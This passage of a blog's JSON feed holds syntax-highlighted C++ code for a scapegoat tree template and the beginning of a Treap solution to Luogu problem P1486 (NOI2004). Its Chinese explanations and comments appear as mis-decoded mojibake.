class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//è¿™ä¸ªæ¿å­æœ‰æ”¹è¿›ä¹‹å¤„ï¼šæ¯”å¦‚åˆ é™¤èŠ‚ç‚¹å¯ä»¥æ‰“ä¸Šåˆ é™¤æ‡’æ ‡è®°ï¼Œå•ä¸ªèŠ‚ç‚¹å¯ä»¥è®°å½•åŒä¸€æ•°å­—æ•°é‡é¿å…å¤šä½™èŠ‚ç‚¹ã€‚</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;cstdio&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;cstdlib&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> inf (1&lt;&lt;30)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> maxn (2100000)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> db double</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> il inline</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> RG register</span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">const</span> db al=<span class=\"number\">0.75</span>;<span class=\"comment\">//Î±</span></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">node</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> son[<span class=\"number\">2</span>],fa,size,num;<span class=\"comment\">//å·¦å³å­©å­å‚¨å­˜åœ°å€ï¼ŒèŠ‚ç‚¹çˆ¶äº²ï¼Œä»¥è¯¥èŠ‚ç‚¹ä¸ºæ ¹å­æ ‘çš„é‡é‡ï¼Œè¯¥èŠ‚ç‚¹å‚¨å­˜çš„æ•°å­—</span></span><br><span class=\"line\">&#125; t[maxn];</span><br><span class=\"line\"><span class=\"type\">int</span> n,cnt,root;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">il <span class=\"type\">bool</span> <span class=\"title\">balance</span><span class=\"params\">(RG <span class=\"type\">int</span> id)</span>   <span class=\"comment\">//åˆ¤æ–­å­æ ‘æ˜¯å¦å¹³è¡¡</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (db)(t[id].size*al&gt;=(db)t[ t[id].son[<span class=\"number\">0</span>] ].size) &amp;&amp; (db)( t[id].size*al&gt;=(db)t[t[ id].son[<span class=\"number\">1</span>] ].size);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> cur[maxn],sum;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">il <span class=\"type\">void</span> <span class=\"title\">recycle</span><span class=\"params\">(RG <span class=\"type\">int</span> id)</span>    <span class=\"comment\">//å‹æ‰ï¼ŒæŠŠéœ€è¦é‡æ„çš„å­æ ‘æ‹å‡ºæ¥å…ˆæ‹æ‰æˆåºåˆ—</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(t[id].son[<span class=\"number\">0</span>]) <span class=\"built_in\">recycle</span>(t[id].son[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    cur[++sum]=id;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(t[id].son[<span class=\"number\">1</span>]) <span class=\"built_in\">recycle</span>(t[id].son[<span class=\"number\">1</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">il <span class=\"type\">int</span> <span class=\"title\">build</span><span class=\"params\">(RG <span class=\"type\">int</span> l,RG <span class=\"type\">int</span> r)</span>   <span class=\"comment\">//é€’å½’å»ºæ ‘ï¼Œä½¿ç»“æ„æœ€ä¼˜</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(l&gt;r) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    RG <span class=\"type\">int</span> mid=(l+r)&gt;&gt;<span class=\"number\">1</span>,id=cur[mid];</span><br><span class=\"line\">    t[ t[id].son[<span class=\"number\">0</span>]=<span class=\"built_in\">build</span>(l,mid<span class=\"number\">-1</span>) ].fa=id;</span><br><span class=\"line\">    t[ t[id].son[<span class=\"number\">1</span>]=<span class=\"built_in\">build</span>(mid+<span class=\"number\">1</span>,r) ].fa=id;</span><br><span class=\"line\">    t[id].size=t[ t[id].son[<span class=\"number\">0</span>] ].size+t[ t[id].son[<span class=\"number\">1</span>] ].size+<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> id;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">il <span class=\"type\">void</span> <span class=\"title\">rebuild</span><span class=\"params\">(RG <span class=\"type\">int</span> id)</span>   <span class=\"comment\">//é‡æ„å­æ ‘ï¼Œå†â€œæ¥å›å»â€</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    sum=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">recycle</span>(id);</span><br><span class=\"line\">    RG <span class=\"type\">int</span> fa=t[id].fa,Son=( t[ t[id].fa ].son[<span class=\"number\">1</span>]==id );</span><br><span class=\"line\">    RG <span class=\"type\">int</span> cur=<span class=\"built_in\">build</span>(<span class=\"number\">1</span>,sum);</span><br><span class=\"line\">    t[ t[fa].son[Son]=cur ].fa=fa;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(id==root) root=cur;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">il <span class=\"type\">void</span> <span class=\"title\">insert</span><span class=\"params\">(RG <span class=\"type\">int</span> x)</span><span class=\"comment\">//æ’å…¥ä¸€ä¸ªæ•°å­—x</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    RG <span class=\"type\">int</span> now=root,cur=++cnt;</span><br><span class=\"line\">    t[cur].size=<span class=\"number\">1</span>,t[cur].num=x;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"number\">1</span>) &#123; <span class=\"comment\">//æ‰¾åˆ°é€‚åˆä½ç½®æ’å…¥</span></span><br><span class=\"line\">        t[now].size++;</span><br><span class=\"line\">        RG <span class=\"type\">bool</span> Son=(x&gt;=t[now].num);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>( t[now].son[Son] ) now=t[now].son[Son];</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            t[ t[now].son[Son]=cur ].fa=now;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    RG <span class=\"type\">int</span> flag=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(RG <span class=\"type\">int</span> i=cur; i; i=t[i].fa) <span class=\"keyword\">if</span>(!<span class=\"built_in\">balance</span>(i)) flag=i;<span class=\"comment\">//æ³¨æ„ï¼šé‡å»ºæ—¶å–æ·±åº¦æœ€æµ…çš„ï¼Œä»¥é¿å…å°å­æ ‘é‡æ„å®Œå¤§å­æ ‘è¿˜é‡æ„ï¼Œæµªè´¹æ—¶é—´</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(flag) <span class=\"built_in\">rebuild</span>(flag); <span class=\"comment\">//æ’å…¥å¾€å¾€ä¼šå¯¼è‡´ä¸å¹³è¡¡,è¿™æ—¶éœ€è¦é‡å»ºä¸å¹³è¡¡çš„å­æ ‘å³å¯</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">il <span class=\"type\">int</span> <span class=\"title\">get_num</span><span class=\"params\">(RG <span class=\"type\">int</span> x)</span>   <span class=\"comment\">//æŸ¥è¯¢ x åœ¨æ ‘ä¸­çš„èŠ‚ç‚¹ç¼–å·ï¼ˆåœ¨æ•°ç»„ä¸­å‚¨å­˜ä½ç½®ä¸‹æ ‡ï¼‰</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    RG <span class=\"type\">int</span> now=root;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(t[now].num==x) <span class=\"keyword\">return</span> now;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> now=t[now].son[ t[now].num&lt;x ];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">il <span class=\"type\">void</span> <span class=\"title\">erase</span><span class=\"params\">(RG <span class=\"type\">int</span> id)</span>   <span class=\"comment\">//åˆ é™¤</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(t[id].son[<span class=\"number\">0</span>] &amp;&amp; t[id].son[<span class=\"number\">1</span>]) &#123;</span><br><span class=\"line\">        RG <span class=\"type\">int</span> cur=t[id].son[<span class=\"number\">0</span>];</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(t[cur].son[<span class=\"number\">1</span>]) cur=t[cur].son[<span class=\"number\">1</span>];</span><br><span class=\"line\">        t[id].num=t[cur].num;</span><br><span class=\"line\">        id=cur;</span><br><span class=\"line\">    &#125; <span class=\"comment\">//åˆ é™¤æ“ä½œéœ€è¦æ‰¾åˆ°å·¦å­æ ‘çš„æœ€åä¸€ä¸ªèŠ‚ç‚¹æˆ–å³å­æ ‘çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹æ¥é¡¶æ›¿,ä¼˜å…ˆæ‰¾å·¦å­æ ‘</span></span><br><span class=\"line\">    RG <span class=\"type\">int</span> Son=(t[id].son[<span class=\"number\">0</span>]) ? t[id].son[<span class=\"number\">0</span>]:t[id].son[<span class=\"number\">1</span>];</span><br><span class=\"line\">    RG <span class=\"type\">int</span> k=( t[ t[id].fa ].son[<span class=\"number\">1</span>]==id );</span><br><span class=\"line\">    t[ t[ t[id].fa ].son[k]=Son ].fa=t[id].fa;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(RG <span class=\"type\">int</span> i=t[id].fa; i; i=t[i].fa) t[i].size--;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(id==root) root=Son;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">il <span class=\"type\">int</span> <span class=\"title\">get_rank</span><span class=\"params\">(RG <span class=\"type\">int</span> x)</span>   <span class=\"comment\">//æŸ¥ x çš„æ’å</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    RG <span class=\"type\">int</span> now=root,ans=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(now) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(t[now].num&lt;x) ans+=t[ t[now].son[<span class=\"number\">0</span>] ].size+<span class=\"number\">1</span>,now=t[now].son[<span class=\"number\">1</span>];</span><br><span class=\"line\">        <span class=\"keyword\">else</span> now=t[now].son[<span class=\"number\">0</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ans;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">il <span class=\"type\">int</span> <span class=\"title\">get_kth</span><span class=\"params\">(RG <span class=\"type\">int</span> x)</span>   <span class=\"comment\">//æŸ¥æ ‘ä¸­çš„ç¬¬ k ä¸ªæ•°</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    RG <span class=\"type\">int</span> now=root;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(t[ t[now].son[<span class=\"number\">0</span>] ].size==x<span class=\"number\">-1</span>) <span class=\"keyword\">return</span> now;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(t[ t[now].son[<span class=\"number\">0</span>] ].size&gt;=x) now=t[now].son[<span class=\"number\">0</span>];</span><br><span class=\"line\">        <span class=\"keyword\">else</span> x-=t[ t[now].son[<span class=\"number\">0</span>] ].size+<span class=\"number\">1</span>,now=t[now].son[<span class=\"number\">1</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> now;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    cnt=<span class=\"number\">2</span>,root=<span class=\"number\">1</span>;</span><br><span class=\"line\">    t[<span class=\"number\">1</span>].num=-inf,t[<span class=\"number\">1</span>].size=<span class=\"number\">2</span>,t[<span class=\"number\">1</span>].son[<span class=\"number\">1</span>]=<span class=\"number\">2</span>;</span><br><span class=\"line\">    t[<span class=\"number\">2</span>].num=inf,t[<span class=\"number\">2</span>].size=<span class=\"number\">1</span>,t[<span class=\"number\">2</span>].fa=<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;n);</span><br><span class=\"line\">    RG <span class=\"type\">int</span> type,x;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(RG <span class=\"type\">int</span> i=<span class=\"number\">1</span>; i&lt;=n; i++) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d%d&quot;</span>,&amp;type,&amp;x);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(type==<span class=\"number\">1</span>) <span class=\"built_in\">insert</span>(x);</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(type==<span class=\"number\">2</span>) <span class=\"built_in\">erase</span>( <span class=\"built_in\">get_num</span>(x) );</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(type==<span class=\"number\">3</span>) <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,<span class=\"built_in\">get_rank</span>(x));</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(type==<span class=\"number\">4</span>) <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,t[ <span class=\"built_in\">get_kth</span>(x+<span class=\"number\">1</span>) ].num);</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(type==<span class=\"number\">5</span>) <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,t[<span class=\"built_in\">get_kth</span>(<span class=\"built_in\">get_rank</span>(x))].num);</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(type==<span class=\"number\">6</span>) <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,t[<span class=\"built_in\">get_kth</span>(<span class=\"built_in\">get_rank</span>(x+<span class=\"number\">1</span>)+<span class=\"number\">1</span>)].num);<span class=\"comment\">//æ³¨æ„æ­¤å¤„ </span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>",
            "tags": [
                "Treap"
            ]
        },
        {
            "id": "http://cubicy.icu/2018/04/09/%E6%B4%9B%E8%B0%B7P1486%20[NOI2004]%E9%83%81%E9%97%B7%E7%9A%84%E5%87%BA%E7%BA%B3%E5%91%98/",
            "url": "http://cubicy.icu/2018/04/09/%E6%B4%9B%E8%B0%B7P1486%20[NOI2004]%E9%83%81%E9%97%B7%E7%9A%84%E5%87%BA%E7%BA%B3%E5%91%98/",
            "title": "æ´›è°·:P1486 [NOI2004]éƒé—·çš„å‡ºçº³å‘˜",
            "date_published": "2018-04-09T14:23:00.000Z",
            "content_html": "<p>åŸé¢˜åœ°å€:<a href=\"https://www.luogu.org/problemnew/show/P1486\">https://www.luogu.org/problemnew/show/P1486</a>  </p>\n<h3 id=\"é¢˜ç›®ç®€è¿°\"><a href=\"#é¢˜ç›®ç®€è¿°\" class=\"headerlink\" title=\"é¢˜ç›®ç®€è¿°\"></a>é¢˜ç›®ç®€è¿°</h3><p>ä¸€ä¸ªåºåˆ—aï¼Œåˆå§‹ä¸ºç©ºã€‚<br>éšæ—¶æ’å…¥ä¸€ä¸ªæ•°ï¼ŒæŸ¥è¯¢ç¬¬kå¤§ï¼Œå…¨ä½“åŠ ï¼Œå…¨ä½“å‡ã€‚<br>ä½†æ˜¯å¦‚æœä»»ä½•æ•°åœ¨ä»»ä½•æ—¶åˆ»ä½äºç»™å®šçš„ä¸‹ç•ŒMINï¼Œåˆ™ç«‹å³ç§»é™¤å‡ºåºåˆ—ã€‚</p>\n<hr>\n<h3 id=\"æ€è·¯\"><a href=\"#æ€è·¯\" class=\"headerlink\" title=\"æ€è·¯\"></a>æ€è·¯</h3><p>æ’å…¥ï¼ŒæŸ¥è¯¢ç¬¬kå¤§ï¼Œå®¹æ˜“å‘ç°æ˜¯BSTé¢˜ã€‚äºæ˜¯ä¸ŠTreapã€‚<br>å…¨ä½“åŠ å…¨ä½“å‡æš´åŠ›åŠ è‚¯å®šä¸è¡Œï¼Œè€ƒè™‘ç”¨å˜é‡deltaå‚¨å­˜å˜åŒ–æƒ…å†µã€‚å…¨ä½“åŠ nå°±æ˜¯delta+&#x3D;nï¼ˆnä¸ºè´Ÿå°±æ˜¯å‡ï¼‰<br>äºæ˜¯æ¯ä¸ªæ•°å®é™…çš„å€¼æ˜¯ï¼šæ ‘é‡Œå‚¨å­˜è¯¥æ•°çš„å€¼+delta  â€”â€”â‘ <br>å‡äº†ä¹‹åå¯èƒ½ä¼šæœ‰æ•°ä½äºä¸‹ç•Œï¼ŒæŸ¥æ‰¾æœ€å°çš„æ•°åˆ¤æ–­æ˜¯ä¸æ˜¯å°äºMINï¼Œæ˜¯çš„è¯åˆ é™¤ï¼Œé‡å¤ç›´åˆ°ä¸å†å°äºMINã€‚<br>æ³¨æ„æ–°æ’å…¥çš„æ•°ä¸åº”è¯¥å—ä¹‹å‰çš„åŠ å‡å½±å“ï¼Œæ‰€ä»¥å°†ä¸€ä¸ªæ•°å­—numæ’å…¥æ ‘ä¸­æ—¶ï¼Œå¦‚æœç›´æ¥æŠŠnumæ’å…¥æ ‘ä¸­ï¼Œå°±å˜æˆnum+deltaäº†ã€‚<br>å®é™…åº”è¯¥æ’å…¥çš„æ˜¯num-deltaï¼Œè¿™æ ·ç»“åˆä¸Šæ–‡â‘ ï¼Œç°åœ¨è¿™ä¸ªæ•°å®é™…çš„å€¼å°±æ˜¯numæœ¬èº«äº†ã€‚<br>æä¾›ä¸€ä¸ªæŒ‡é’ˆå®ç°çš„Treapï¼Œä¸æ¨èä½¿ç”¨å…¶å®ï¼Œè°ƒçš„æ—¶å€™å¿«æŠŠæˆ‘æåè¡€ã€‚</p>\n<hr>\n<h3 id=\"ä»£ç \"><a href=\"#ä»£ç \" class=\"headerlink\" title=\"ä»£ç \"></a>ä»£ç </h3><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\">    <span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;cstdlib&gt;</span></span></span><br><span class=\"line\">    <span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;cstring&gt;</span></span></span><br><span class=\"line\">    <span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;cstdio&gt;</span></span></span><br><span class=\"line\">    <span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;ctime&gt;</span></span></span><br><span class=\"line\">    <span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;cctype&gt;</span></span></span><br><span class=\"line\">    <span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\">    <span class=\"type\">const</span> <span class=\"type\">int</span> MAXN=<span class=\"number\">200010</span>;</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">Node</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> d,rnd,size;</span><br><span class=\"line\">        Node *ch[<span class=\"number\">2</span>],*pa;</span><br><span class=\"line\">    &#125;pool[MAXN],*root;</span><br><span class=\"line\">    <span class=\"type\">int</span> tot=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"function\">Node *<span class=\"title\">newnode</span><span class=\"params\">(<span class=\"type\">int</span> d)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        Node *p=&amp;pool[++tot];</span><br><span class=\"line\">        p-&gt;d=d;p-&gt;rnd=<span class=\"built_in\">rand</span>();p-&gt;size=<span class=\"number\">1</span>;</span><br><span class=\"line\">        p-&gt;ch[<span class=\"number\">0</span>]=p-&gt;ch[<span class=\"number\">1</span>]=<span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">int</span> <span class=\"title\">size</span><span class=\"params\">(Node *p)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p?p-&gt;size:<span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">update</span><span class=\"params\">(Node *p)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        p-&gt;size=<span class=\"built_in\">size</span>(p-&gt;ch[<span class=\"number\">0</span>])+<span class=\"built_in\">size</span>(p-&gt;ch[<span class=\"number\">1</span>])+<span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">rotate</span><span class=\"params\">(Node *p,<span class=\"type\">int</span> t)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        Node *pa=p-&gt;pa,*gp=pa-&gt;pa,*son=p-&gt;ch[t^<span class=\"number\">1</span>];</span><br><span class=\"line\">        pa-&gt;ch[t]=son;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(son)son-&gt;pa=pa;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(gp)gp-&gt;ch[pa==gp-&gt;ch[<span class=\"number\">1</span>]]=p;</span><br><span class=\"line\">        p-&gt;pa=gp;</span><br><span class=\"line\">        p-&gt;ch[t^<span class=\"number\">1</span>]=pa;</span><br><span class=\"line\">        pa-&gt;pa=p;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(pa==root)root=p;</span><br><span class=\"line\">        <span class=\"built_in\">update</span>(pa);</span><br><span class=\"line\">        <span class=\"built_in\">update</span>(p);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">treap</span><span class=\"params\">(Node *p)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(p==root || p-&gt;rnd &gt;= p-&gt;pa-&gt;rnd)<span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"built_in\">rotate</span>(p,p==p-&gt;pa-&gt;ch[<span class=\"number\">1</span>]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">insert</span><span class=\"params\">(Node *r,Node *p)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!r)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            root=p;</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"type\">int</span> f=(p-&gt;d &gt;= r-&gt;d);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!r-&gt;ch[f])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            